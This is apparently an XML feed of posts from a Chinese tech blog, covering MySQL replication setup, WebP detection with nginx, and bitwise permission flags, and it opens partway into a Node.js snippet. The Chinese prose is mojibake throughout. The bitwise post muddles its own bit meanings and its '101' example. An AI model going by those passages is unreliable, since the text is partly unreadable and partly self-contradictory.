class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  1 */</span>  <span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="comment">/*  2 */</span>  <span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"><span class="comment">/*  3 */</span>  </span><br><span class="line"><span class="comment">/*  4 */</span>  <span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">/*  5 */</span>      <span class="keyword">let</span> query = url.<span class="title function_">parse</span>(req.<span class="property">url</span>).<span class="property">query</span>;</span><br><span class="line"><span class="comment">/*  6 */</span>  </span><br><span class="line"><span class="comment">/*  7 */</span>      db.<span class="title function_">query</span>(&#123; <span class="attr">id</span>: query.<span class="property">id</span> &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="comment">/*  8 */</span>          res.<span class="title function_">end</span>();</span><br><span class="line"><span class="comment">/*  9 */</span>      &#125;);</span><br><span class="line"><span class="comment">/* 10 */</span>  &#125;);</span><br><span class="line"><span class="comment">/* 12 */</span>  </span><br><span class="line"><span class="comment">/* 13 */</span>  server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="comment">/* 14 */</span>      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://localhost:3000/&#x27;</span>);</span><br><span class="line"><span class="comment">/* 15 */</span>  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•å¤æ‚åº¦åˆ†æ</title>
      <link href="/post/algorithmic-analysis.html"/>
      <url>/post/algorithmic-analysis.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.cnblogs.com/gaochundong/p/complexity_of_algorithms.html">ã€1ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> algorithmic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>make&amp;Makefile&amp;cmake</title>
      <link href="/post/make-makefile-cmake.html"/>
      <url>/post/make-makefile-cmake.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://zhihu.com/question/27455963/answer/89770919">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL Binlog</title>
      <link href="/post/mysql-binlog.html"/>
      <url>/post/mysql-binlog.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/martinzhang/p/3454358.html">ã€1ã€‘</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL ä¸»ä»åŒæ­¥</title>
      <link href="/post/mysql-master-slave.html"/>
      <url>/post/mysql-master-slave.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>MySQL ä¸»ä»åŒæ­¥æ˜¯åœ¨ MySQL ä¸»ä»å¤åˆ¶(Master-Slave Replication)åŸºç¡€ä¸Šå®ç°çš„ï¼Œé€šè¿‡è®¾ç½®åœ¨Master MySQLä¸Š çš„ binlog (ä½¿å…¶å¤„äºæ‰“å¼€çŠ¶æ€)ï¼ŒSlave MySQL ä¸Šé€šè¿‡ä¸€ä¸ª I&#x2F;O çº¿ç¨‹ä» Master MySQL ä¸Šè¯»å– binlogï¼Œç„¶åä¼ è¾“åˆ° Slave MySQL çš„ä¸­ç»§æ—¥å¿—ä¸­ï¼Œç„¶å Slave MySQL çš„ SQL çº¿ç¨‹ä»ä¸­ç»§æ—¥å¿—ä¸­è¯»å–ä¸­ç»§æ—¥å¿—ï¼Œç„¶ååº”ç”¨åˆ° Slave MySQL çš„æ•°æ®åº“ä¸­ã€‚è¿™æ ·å®ç°äº†ä¸»ä»æ•°æ®åŒæ­¥åŠŸèƒ½ã€‚</p><h3 id="é…ç½®ä¸»ä»åŒæ­¥"><a href="#é…ç½®ä¸»ä»åŒæ­¥" class="headerlink" title="é…ç½®ä¸»ä»åŒæ­¥"></a>é…ç½®ä¸»ä»åŒæ­¥</h3><p>mysqlä¸»å¤‡å¤åˆ¶å®ç°</p><p><img src="/images/687474703a2f2f646c2e6974.jpeg"></p><p>ä»ä¸Šå±‚æ¥çœ‹ï¼Œå¤åˆ¶åˆ†æˆä¸‰æ­¥ï¼š</p><ol><li>masterå°†æ”¹å˜è®°å½•åˆ°äºŒè¿›åˆ¶æ—¥å¿—(binary log)ä¸­ï¼ˆè¿™äº›è®°å½•å«åšäºŒè¿›åˆ¶æ—¥å¿—äº‹ä»¶ï¼Œbinary log eventsï¼Œå¯ä»¥é€šè¿‡show binlog eventsè¿›è¡ŒæŸ¥çœ‹ï¼‰ï¼›</li><li>slaveå°†masterçš„binary log eventsæ‹·è´åˆ°å®ƒçš„ä¸­ç»§æ—¥å¿—(relay log)ï¼›</li><li>slaveé‡åšä¸­ç»§æ—¥å¿—ä¸­çš„äº‹ä»¶ï¼Œå°†æ”¹å˜åæ˜ å®ƒè‡ªå·±çš„æ•°æ®ã€‚</li></ol><h4 id="é…ç½®ä¸»åº“"><a href="#é…ç½®ä¸»åº“" class="headerlink" title="é…ç½®ä¸»åº“"></a>é…ç½®ä¸»åº“</h4><ol><li><p>å¼€å¯ä¸»æ•°æ®åº“çš„ binlogï¼ˆäºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼‰ï¼Œå¹¶è®¾ç½® server-id</p><p> ä¿®æ”¹é…ç½®æ–‡ä»¶</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line">server-id = 1  </span><br><span class="line">log-bin = mysql-bin   </span><br><span class="line">binlog-format = row</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºç”¨äºåŒæ­¥æ•°æ®çš„è´¦å· slave   </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant replication slave on *.* to &#x27;slave&#x27;@&#x27;%&#x27; identified by &#x27;slave2017&#x27;;</span><br><span class="line"></span><br><span class="line">flush privileges;   </span><br></pre></td></tr></table></figure></li><li><p>é”è¡¨å¹¶æŸ¥çœ‹å½“å‰æ—¥å¿—åç§°å’Œä½ç½®(pos)    </p><p> é”è¡¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush table with read lock;</span><br></pre></td></tr></table></figure><blockquote><p>5.1ç‰ˆæœ¬çš„MySQLç‰ˆæœ¬çš„é”è¡¨è¯­å¥æ˜¯flush tables with read lock; 5.5ç‰ˆæœ¬çš„MySQLçš„é”è¡¨è¯­å¥æ˜¯flush table with read lock;</p></blockquote><p> æŸ¥çœ‹ä½ç½®</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;  </span><br><span class="line">+------------------+----------+--------------+------------------+  </span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |  </span><br><span class="line">+------------------+----------+--------------+------------------+  </span><br><span class="line">| mysql-bin.000009 |      196 |              |                  |  </span><br><span class="line">+------------------+----------+--------------+------------------+  </span><br><span class="line">1 row in set  </span><br></pre></td></tr></table></figure></li><li><p>å¤‡ä»½å½“å‰ä¸»æ•°æ®åº“çš„å…¨éƒ¨æ•°æ®ï¼ˆå…¨å¤‡ï¼‰</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -ppassword -S /var/lib/mysql/mysql.sock  -B curder --events --master-data=2 &gt; rep.sql</span><br></pre></td></tr></table></figure><blockquote><p>ä¹Ÿå¯ä»¥ç›´æ¥å°†å¯¼å‡ºç»“æœå¯¼å…¥ä»åº“</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -ppassword -S /var/lib/mysql/mysql.sock  -B curder --events --master-data=2 | mysql -uroot -paaaaaa -h10.0.1.4</span><br></pre></td></tr></table></figure></blockquote></li><li><p>è§£é”æ•°æ®åº“</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlock tables;</span><br></pre></td></tr></table></figure></li></ol><h4 id="é…ç½®ä»åº“"><a href="#é…ç½®ä»åº“" class="headerlink" title="é…ç½®ä»åº“"></a>é…ç½®ä»åº“</h4><ol><li><p>é…ç½® server-id</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line">server-id = 2</span><br></pre></td></tr></table></figure></li><li><p>å°†å…¨å¤‡å¯¼å…¥åˆ°æ•°æ®åº“</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -paaaaaa -S /var/lib/mysql/mysql.sock &lt; ~/rep.sql</span><br></pre></td></tr></table></figure></li><li><p>æ‰§è¡ŒåŒæ­¥å‘½ä»¤</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; change master to master_host=&#x27;10.0.1.11&#x27;,master_user=&#x27;slave&#x27;,master_password=&#x27;slave2017&#x27;,master_log_file=&#x27;mysql-bin.000009&#x27;,master_log_pos=196;  </span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„ <code>master_log_file</code> å’Œ <code>master_log_pos</code> å°±æ˜¯ä¸»è¡¨é”è¡¨åæ‰§è¡Œ<code>show master status;</code> è¾“å‡ºçš„ã€‚</p></blockquote><p> å¼€å¯åŒæ­¥</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start slave;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹åŒæ­¥çŠ¶æ€</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show slave status\G</span><br></pre></td></tr></table></figure><blockquote><p>Slave_IO_Running: Yes # ä»åº“IOè¿›ç¨‹(ä»masteræœåŠ¡å™¨å–logçš„çº¿ç¨‹)<br>Slave_SQL_Running: Yes # ä»åº“SQLè¿›ç¨‹(è¯»å–relaylog å†™æ•°æ®)<br>Seconds_Behind_Master: 0 # è½åä¸»åº“çš„ç§’æ•°</p></blockquote></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://wangwei007.blog.51cto.com/68019/965575">ã€1ã€‘</a><a href="http://blog.csdn.net/mycwq/article/details/17136001">ã€2ã€‘</a> <a href="https://www.kancloud.cn/curder/mysql/71977">ã€3ã€‘</a><a href="http://www.cnblogs.com/martinzhang/p/3454386.html">ã€4ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WebP</title>
      <link href="/post/webp.html"/>
      <url>/post/webp.html</url>
      
        <content type="html"><![CDATA[<h2 id="WebP"><a href="#WebP" class="headerlink" title="WebP"></a>WebP</h2><h3 id="Can-i-use-WebP"><a href="#Can-i-use-WebP" class="headerlink" title="Can i use WebP"></a>Can i use WebP</h3><ol><li><p>æ ¹æ®acceptè¯·æ±‚å¤´åˆ¤æ–­</p><p> å¦‚æœæ˜¯Chromeæµè§ˆå™¨å®ƒä¼šåœ¨è¯·æ±‚å¤´<code>accept</code>ä¸­åŠ å…¥<code>image/webp</code>ã€‚</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br></pre></td></tr></table></figure></li><li><p>å‰ç«¯æ£€æµ‹</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check_webp_feature:</span></span><br><span class="line"><span class="comment">//   &#x27;feature&#x27; can be one of &#x27;lossy&#x27;, &#x27;lossless&#x27;, &#x27;alpha&#x27; or &#x27;animation&#x27;.</span></span><br><span class="line"><span class="comment">//   &#x27;callback(feature, result)&#x27; will be passed back the detection result (in an asynchronous way!)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_webp_feature</span>(<span class="params">feature, callback</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> kTestImages = &#123;</span><br><span class="line">        <span class="attr">lossy</span>: <span class="string">&quot;UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA&quot;</span>,</span><br><span class="line">        <span class="attr">lossless</span>: <span class="string">&quot;UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==&quot;</span>,</span><br><span class="line">        <span class="attr">alpha</span>: <span class="string">&quot;UklGRkoAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAwAAAARBxAR/Q9ERP8DAABWUDggGAAAABQBAJ0BKgEAAQAAAP4AAA3AAP7mtQAAAA==&quot;</span>,</span><br><span class="line">        <span class="attr">animation</span>: <span class="string">&quot;UklGRlIAAABXRUJQVlA4WAoAAAASAAAAAAAAAAAAQU5JTQYAAAD/////AABBTk1GJgAAAAAAAAAAAAAAAAAAAGQAAABWUDhMDQAAAC8AAAAQBxAREYiI/gcA&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> result = (img.<span class="property">width</span> &gt; <span class="number">0</span>) &amp;&amp; (img.<span class="property">height</span> &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="title function_">callback</span>(feature, result);</span><br><span class="line">    &#125;;</span><br><span class="line">    img.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">callback</span>(feature, <span class="literal">false</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&quot;data:image/webp;base64,&quot;</span> + kTestImages[feature];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>å¦‚æœä½¿ç”¨äº†<code>å†…å®¹åå•†</code>çš„æ–¹å¼è¿”å›äº†webpæ ¼å¼çš„å›¾ç‰‡ï¼Œåœ¨ä½¿ç”¨CDNæˆ–ç¼“å­˜çš„æƒ…å†µæˆ‘ä»¬éœ€è¦åœ¨å“åº”å¤´åŠ å…¥<a href="http-vary.html">Vary</a>å­—æ®µæ¥å‘Šè¯‰è¯¥å¦‚ä½•ç¼“å­˜ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ ^/webp/(.*)\.(jpg|png|gif)$</span> &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$filename</span>    <span class="variable">$1</span>;</span><br><span class="line">    <span class="comment"># åˆ¤æ–­æ˜¯å¦æ”¯æŒwebpåŠæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$swebp</span>       <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment"># $swebp ç¬¬ä¸€ä½ç”¨æ¥åˆ¤æ–­å®¢æˆ·ç«¯æ˜¯å¦æ”¯æŒwebp</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$http_accept</span> <span class="regexp">~* &quot;image\/webp&quot;)</span> &#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$swebp</span>   <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># $swebp ç¬¬äºŒä½ç”¨æ¥åˆ¤æ–­å¯¹åº”çš„webpæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="attribute">if</span> (-f <span class="string">&quot;<span class="variable">$&#123;document_root&#125;</span>/webp/<span class="variable">$&#123;filename&#125;</span>.webp&quot;</span>) &#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$swebp</span>   <span class="string">&quot;<span class="variable">$&#123;swebp&#125;</span>1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$swebp</span> = <span class="string">&quot;11&quot;</span>) &#123;</span><br><span class="line">        <span class="comment"># add_header Vary   &quot;Accept,Content-Type&quot;;</span></span><br><span class="line">        <span class="comment"># add_header Vary   &quot;Content-Type&quot;;</span></span><br><span class="line">        <span class="attribute">add_header</span>   Vary   Accept;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^</span> /webp/<span class="variable">$&#123;filename&#125;</span>.webp <span class="literal">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—® <a href="http://example.kekek.cc/webp/2018-FIFA-World-Cup.png">http://example.kekek.cc/webp/2018-FIFA-World-Cup.png</a> æŸ¥çœ‹</p><p>ä¸‹é¢ä¸¤å¹…å›¾åˆ†åˆ«ä¸ºåœ¨Chromeå’ŒFirefoxæµè§ˆå™¨ä¸­è®¿é—®çš„å“åº”ï¼š<br><strong>Chrome</strong><br><img src="/images/webp-chrome.png" alt="Chrome WebP"></p><p><strong>Firefox</strong><br><img src="/images/webp-firefox.png" alt="Firefox WebP"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://developers.google.com/speed/webp/faq">What is WebP? Why should I use it?</a> </li><li><a href="http://zmx.im/blog?bname=webp">ç¾å›¢åœ¨webpæ–¹é¢çš„å®è·µ</a> </li><li><a href="http://www.btorange.com/2013/06/14/webp.html">WEBPæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</a> </li><li><a href="http://blog.csdn.net/u013063153/article/details/52677737">æ‰’ä¸€æ‰’â€œWEBPæ ¼å¼â€çš„å›¾ç‰‡</a> </li><li><a href="https://optimus.keycdn.com/support/webp-support/">WebP Support â€“ Itâ€™s More Than You Think</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä½è¿ç®—å’Œæƒé™ç®¡ç†ç³»ç»Ÿ</title>
      <link href="/post/bitwise-permission.html"/>
      <url>/post/bitwise-permission.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>åœ¨ Linux æ–‡ä»¶ç³»ç»Ÿä¸­ç”¨æˆ·å¯¹æ–‡ä»¶æœ‰ <code>è¯»</code>ã€<code>å†™</code>ã€<code>æ‰§è¡Œ</code>ä¸‰ç§æƒé™ï¼Œå¯ä»¥åˆ†åˆ«ä½¿ç”¨æ•°å­—ï¼š<code>4</code>ã€<code>2</code>ã€<code>1</code> ä¸‰ä¸ªæ•°å­—æ¥è¡¨ç¤ºã€‚ä¸‰ä¸ªæ•°å­—ä»»æ„ç»„åˆå¯ä»¥è¡¨ç¤ºä¸åŒçš„æƒé™ï¼Œä¾‹å¦‚ï¼š 7 ï¼ˆ4 + 2 + 1ï¼‰è¡¨ç¤ºç”¨æˆ·å¯¹å¯¹æ­¤æ–‡ä»¶æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œ6 ï¼ˆ4 + 2ï¼‰è¡¨ç¤ºç”¨æˆ·å¯¹æ­¤æ–‡ä»¶æœ‰<code>è¯»</code>ã€<code>å†™</code>æƒé™ã€‚</p><h3 id="ä¸ºä»€ä¹ˆæ˜¯1ã€2ã€4-ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæ˜¯1ã€2ã€4-ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæ˜¯1ã€2ã€4 ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæ˜¯1ã€2ã€4 ï¼Ÿ</h3><p>å¯¹äº <code>è¯»</code>ã€<code>å†™</code>ã€<code>æ‰§è¡Œ</code> æˆ‘ä»¬ç”¨<code>0</code>è¡¨ç¤ºç”±æ­¤æƒé™ï¼Œ<code>1</code>è¡¨ç¤ºæ— æ­¤æƒé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¯» å†™ æ‰§è¡Œ        äºŒè¿›åˆ¶     åè¿›åˆ¶</span><br><span class="line">0  0  0    ==&gt;   000   ==&gt;   0</span><br><span class="line">0  0  1    ==&gt;   001   ==&gt;   1   // æ‰§è¡Œ</span><br><span class="line">0  1  0    ==&gt;   010   ==&gt;   2   // å†™</span><br><span class="line">1  0  0    ==&gt;   100   ==&gt;   4   // è¯»</span><br><span class="line"></span><br><span class="line">0  1  1    ==&gt;   011   ==&gt;   3   // æ‰§è¡Œ + å†™</span><br><span class="line">1  0  1    ==&gt;   101   ==&gt;   5   // è¯» + æ‰§è¡Œ</span><br><span class="line">1  1  0    ==&gt;   110   ==&gt;   6   // è¯» + å†™</span><br><span class="line">1  1  1    ==&gt;   111   ==&gt;   7   // è¯» + å†™ + æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆæ˜¯<code>1</code>ã€<code>2</code>ã€<code>4</code>?<br><code>1</code>ã€<code>2</code>ã€<code>4</code> çš„äºŒè¿›åˆ¶è¡¨ç°å½¢å¼æ˜¯<code>001</code>ã€<code>010</code>ã€<code>100</code>ï¼Œå®ƒä»¬çš„äºŒè¿›åˆ¶è¡¨ç°å½¢å¼åªæœ‰ä¸€ä½æ˜¯<code>1</code>ã€‚è¿™æ ·ï¼Œåœ¨æƒé™å åŠ æ—¶ï¼Œä¸ä¼šå‡ºç°è¿›ä½çš„æƒ…å†µã€‚æˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­æœ€ç»ˆç»“æœçš„äºŒè¿›åˆ¶ä½çš„<code>0</code>ã€<code>1</code>æƒ…å†µæ¥åˆ¤æ–­æ˜¯å¦æœ‰æ­¤æƒé™ã€‚<br>ä¾‹å¦‚<code>è¯» + å†™</code> æƒé™ <code>101</code>ã€‚ç¬¬ä¸€ä½<code>è¯»</code>æƒé™ä¸º<code>1</code>ï¼Œæœ‰<code>è¯»</code>æƒé™ã€‚ç¬¬äºŒä½<code>å†™</code>æƒé™ä¸º<code>0</code>ï¼Œæ— å†™æƒé™ã€‚ç¬¬ä¸‰ä½<code>æ‰§è¡Œ</code>æƒé™ä¸º<code>1</code>è¡¨ç¤ºæœ‰æ‰§è¡Œæƒé™ã€‚</p><h3 id="ä½è¿ç®—å®ç°æƒé™æ“ä½œ"><a href="#ä½è¿ç®—å®ç°æƒé™æ“ä½œ" class="headerlink" title="ä½è¿ç®—å®ç°æƒé™æ“ä½œ"></a>ä½è¿ç®—å®ç°æƒé™æ“ä½œ</h3><h4 id="æˆ–è¿ç®—å®ç°æƒé™çš„æ·»åŠ "><a href="#æˆ–è¿ç®—å®ç°æƒé™çš„æ·»åŠ " class="headerlink" title="æˆ–è¿ç®—å®ç°æƒé™çš„æ·»åŠ "></a>æˆ–è¿ç®—å®ç°æƒé™çš„æ·»åŠ </h4><p>å¢åŠ æƒé™ä½¿ç”¨<code>æˆ–</code>ï¼ˆ<code>|</code>ï¼‰è¿ç®—å®ç°ã€‚</p><p>å¦‚ï¼Œä¸ºç”¨æˆ·å¢åŠ â€œè¯»å–â€ã€â€œå†™å…¥â€ä¸¤ç§æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¯»   å†™   æ‰§è¡Œ      äºŒè¿›åˆ¶     åè¿›åˆ¶</span><br><span class="line">0    1    0   ==&gt;   010  ==&gt;  2</span><br><span class="line">1    0    0   ==&gt;   100  ==&gt;  4</span><br><span class="line">1    1    0   ==&gt;   110  ==&gt;  6  // æˆ–ï¼ˆ|ï¼‰è¿ç®—ç»“æœ</span><br></pre></td></tr></table></figure><p>â€œè¯»å†™â€ä¸¤ç§æƒé™ï¼Œæƒé™ç ä¸º<code>6</code>ï¼ˆ<code>110</code>ï¼‰ï¼Œå…¶ç”±æƒé™ç <code>2</code>ï¼ˆ<code>010</code>ï¼‰å’Œ<code>4</code>ï¼ˆ<code>100</code>ï¼‰è¿›è¡Œ<code>æˆ–</code>ï¼ˆ<code>|</code>ï¼‰è¿ç®—åå®ç°ï¼Œå³ï¼š<code>6 = 2 | 4</code>ï¼Œä¹Ÿå¯ä»¥ç”±<code>6 = 2 + 4</code>è®¡ç®—å¾—å‡ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addPermission (æƒé™é›†å€¼, æƒé™é¡¹) &#123;</span><br><span class="line">    return æƒé™é›†å€¼ | æƒé™é¡¹</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸è¿ç®—å®ç°æƒé™çš„åˆ¤æ–­"><a href="#ä¸è¿ç®—å®ç°æƒé™çš„åˆ¤æ–­" class="headerlink" title="ä¸è¿ç®—å®ç°æƒé™çš„åˆ¤æ–­"></a>ä¸è¿ç®—å®ç°æƒé™çš„åˆ¤æ–­</h4><p>åœ¨éœ€è¦è¿›è¡Œç”¨æˆ·æƒé™åˆ¤æ–­æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>ä¸</code>ï¼ˆ<code>&amp;</code>ï¼‰è¿ç®—åˆ¤æ–­ç”¨æˆ·æ˜¯å¦æ®æœ‰æŸé¡¹æƒé™ã€‚</p><p>å¦‚ï¼Œåˆ¤æ–­æƒé™ç ä¸º<code>6</code>ç”¨æˆ·æ˜¯å¦æœ‰è¯»å–æƒé™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¯»   å†™   æ‰§è¡Œ      äºŒè¿›åˆ¶     åè¿›åˆ¶</span><br><span class="line">1    1    0   ==&gt;   110  ==&gt;  6</span><br><span class="line">1    0    0   ==&gt;   100  ==&gt;  4</span><br><span class="line">1    0    0   ==&gt;   100  ==&gt;  4  // ä¸ï¼ˆ&amp;ï¼‰è¿ç®—ç»“æœ</span><br></pre></td></tr></table></figure><p>æƒé™ç <code>6</code>ï¼ˆ<code>110</code>ï¼‰å’Œ<code>4</code>ï¼ˆ<code>100</code>ï¼‰çš„ä¸è¿ç®—ç»“æœä¸º <code>4</code>ï¼Œå³ï¼š<code>4 = 6 &amp; 4</code>ã€‚</p><p>åˆ¤æ–­æƒé™ç ä¸º6ç”¨æˆ·æ˜¯å¦æœ‰æ‰§è¡Œæƒé™ï¼š</p><figure 